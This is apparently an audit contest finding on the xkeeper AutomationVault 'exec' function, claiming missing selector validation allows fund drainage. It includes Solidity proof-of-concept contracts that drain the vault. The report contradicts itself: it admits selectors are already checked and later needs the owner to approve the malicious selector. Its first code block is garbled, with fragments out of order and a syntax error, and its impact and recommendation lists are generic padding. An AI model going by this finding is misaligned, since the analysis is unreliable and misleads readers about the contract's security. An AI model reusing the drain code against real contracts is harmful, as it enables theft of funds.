# Lack of Validation for Function Selectors in exec Function - Unintended Execution and Fund Drainage

## Summary
The `exec` function in the `AutomationVault` contract allows relays to execute a list of jobs and issue payments based on specified data. However, there is a lack of proper validation for the function selectors within the execution data (`_execData`). This vulnerability allows an attacker to execute arbitrary functions on approved jobs and potentially drain funds from the contract, leading to severe financial loss and disruption of the system's intended functionality.

## Vulnerability Detail
The exec function in the `AutomationVault` contract is designed to allow relays to execute a list of jobs and issue payments based on specified execution data (`_execData`) and fee data (`_feeData`). However, the function lacks proper validation of the function selectors provided in the execution data. This oversight leads to several vulnerabilities:

-    Arbitrary Function Execution: The function does validate whether the relay caller (`_relayCaller`) is authorized to call the relay, and it verifies if the selectors of the functions in the execution data are approved for the specific job. However, the exec function does not thoroughly validate the function selectors within the execution data. As a result, an attacker could potentially pass arbitrary function selectors that are not part of the contract's intended logic.

-    Unintended Function Calls: By manipulating the function selectors in the execution data, an attacker could execute functions that were not intended to be executed. This could allow the attacker to perform unauthorized actions, such as calling functions that transfer funds or manipulate the state of the contract in unintended ways.

-    Manipulation of Fee Data: The exec function handles fee data, including transferring tokens to specified recipients. If an attacker is able to manipulate the execution data to include arbitrary function selectors, they could influence the fee data in ways that benefit them financially, such as directing payments to their own addresses.

-    Lack of Strong Access Control: Since the `exec `function relies heavily on the caller being an approved `relay` caller, there is a risk that compromised or malicious `relay` callers could exploit the function to perform unauthorized actions using arbitrary function selectors.

## Impact
- Malicious Job Execution: The lack of validation for function selectors in the `exec` function may allow attackers to execute unauthorized jobs through relays. This can lead to the execution of malicious functions, affecting the normal operation of the contract and its associated jobs.
- Relay Compromise: If attackers can manipulate the `exec` data or fee data in the `exec` function, they may be able to compromise `relays`. This can include redirecting fees meant for relays to other addresses or causing relays to perform unauthorized actions.
- Unauthorized Execution of Functions: The lack of validation for function selectors within the exec function allows attackers to execute arbitrary functions in the contract or related contracts. This can lead to unauthorized state changes within the contract, which can have unintended side effects such as altering critical parameters or even corrupting data.

- Fund Drainage: The manipulation of fee data within the exec function allows attackers to drain funds from the contract. They can direct fees to their own address or other unintended recipients, leading to significant financial loss for the contract and its users.

- Contract Disruption: Unauthorized function execution and fund drainage can disrupt the normal functioning of the contract. This may lead to a loss of trust among users and stakeholders, damaging the reputation of the contract and its associated projects.

- Security Breaches: The vulnerabilities may lead to security breaches, where attackers gain control over the contract's functionality. This can enable further exploits and attacks on other interconnected contracts or platforms.

- Financial Loss for Users: Users who rely on the contract for its intended purpose may suffer financial loss due to fund drainage or other unauthorized actions. This can discourage further use of the contract and damage its user base.

## Code Snippet
https://github.com/sherlock-audit/2024-04-xkeeper/blob/main/xkeeper-core/solidity/contracts/core/AutomationVault.sol#L397

## Proof of Concept
-    `MaliciousJob`: This contract represents the malicious job that the attacker will execute. It contains a function, `drainFunds()`, that transfers all the tokens from the `AutomationVault` to the attacker's address.

-    `ExploitPOC`: This contract contains the logic to execute the exploit. It creates an instance of `MaliciousJob` and uses the exec function of the `AutomationVault` to execute the `drainFunds()` function.

-    In the `executeExploit()` function, the attacker prepares an `execData` array containing the job contract and job data (`drainFunds()` function) to be executed. The attacker will then calls the exec function of the vault to execute the malicious job.

        IERC20(token).transferFrom(automationVault, attacker, balance);

        attacker = _attacker;

        // Deploy a malicious job contract
        maliciousJob = new MaliciousJob(address(vault), _token, _attacker);
    }

        // Prepare the execution data for the malicious function call
        bytes memory jobData = abi.encodeWithSignature("drainFunds()");
        
        // Prepare the execution data array
        AutomationVault.ExecData[] memory execData = new AutomationVault.ExecData[](1);
        execData[0] = AutomationVault.ExecData({
            job: address(maliciousJob),
            jobData: jobData
        });
        
        // Execute the malicious job using the exec function in the vault
        vault.exec(attacker, execData, new AutomationVault.FeeData );
    }
}

```
You can try is also: 
1. Deploy a malicious contract with a function that performs harmful actions, such as draining funds from the `AutomationVault` contract.
```solidity
// Malicious contract that performs harmful actions
contract MaliciousContract {
    // Reference to the AutomationVault contract
    address public automationVault;

    constructor(address _automationVault) {
        automationVault = _automationVault;
    }

    // Function to drain funds from the AutomationVault
    function drainFunds() external {
        // Cast the AutomationVault address to the correct interface
        IAutomationVault vault = IAutomationVault(automationVault);

        // Specify the token, amount, and receiver address
        // Using `automationVault` itself to drain the funds
        address token = vault.NATIVE_TOKEN();
        uint256 amount = address(vault).balance; // Drain all ETH
        address receiver = msg.sender; // Send to the attacker

        // Invoke the withdrawFunds function on the AutomationVault contract
        vault.withdrawFunds(token, amount, receiver);
    }
}

```
2.  Find a way to add the function selector of the `drainFunds` function (`0x1f4b0ce5`) to the `_approvedJobSelectors` mapping for the target job. 
```solidity
// Function to add the malicious function selector to the _approvedJobSelectors mapping
function addMaliciousFunctionSelector(address relay, address job, address owner) external {
    // This function should be called by the owner to add the selector for `drainFunds`
    // Encode the function selector for `drainFunds`
    bytes4 maliciousSelector = bytes4(keccak256("drainFunds()"));

    // Simulate the owner calling an approval function to add the selector to the relay and job
    // This should ideally be in a separate script or function that owner would execute
    _approvedJobSelectors[relay][job].add(maliciousSelector);
}

```
3. As an approved relay caller, invoke the `exec` function with the address of the malicious contract as the job and the function selector pointing to the `drainFunds` function.
```solidity
// Function to execute the malicious function using the exec function of AutomationVault
function executeMaliciousFunction(address automationVault, address relayCaller, address maliciousContract) external {
    // Define ExecData for the malicious function execution
    IAutomationVault.ExecData[] memory execData = new IAutomationVault.ExecData[](1);
    execData[0] = IAutomationVault.ExecData({
        job: maliciousContract,
        jobData: abi.encodeWithSignature("drainFunds()") // Function call data for `drainFunds`
    });

    // Invoke the exec function
    IAutomationVault(automationVault).exec(relayCaller, execData, new IAutomationVault.FeeData );
}

```
4. Once the malicious function is executed, monitor the blockchain for transaction confirmation and check if the attack was successful (e.g., funds are drained to the attacker's account).

## Tool used

Manual Review

## Recommendation
-    Use whitelisting and blacklisting mechanisms to control which functions, jobs, and callers can interact with the contract.
-    Block known malicious actors and suspicious transactions.
-    Implement rate limiting and throttling to prevent attackers from spamming the exec function with malicious or excessive transactions.
 -    Control the number of times a relay or job can be executed in a given period.
 -    Enhance logging and monitoring of executed jobs and issued payments to detect any anomalous behavior.
-    Set up alerts to notify administrators of any unauthorized or unexpected actions.
-   Securely manage the storage and access to approved jobs and selectors.
-   Use proper access control to manage the addition and removal of jobs and selectors in the contract.
-   Implement strict checks to verify that the msg.sender is authorized to execute the specified relay and job actions.
-  Use access control mechanisms to ensure that only approved entities can interact with relays.
-  Ensure that the function selectors provided in the exec function are strictly validated against a list of approved function selectors.
-  Implement access control checks to verify that the function selectors correspond to the intended job contracts and actions.
-  Reject any function selectors that are not on the approved list.
-  Set limits on the number of transactions that can be executed in a single call to the exec function.
-   Limit the fee data and execution data in each transaction to prevent excessive or malicious usage.
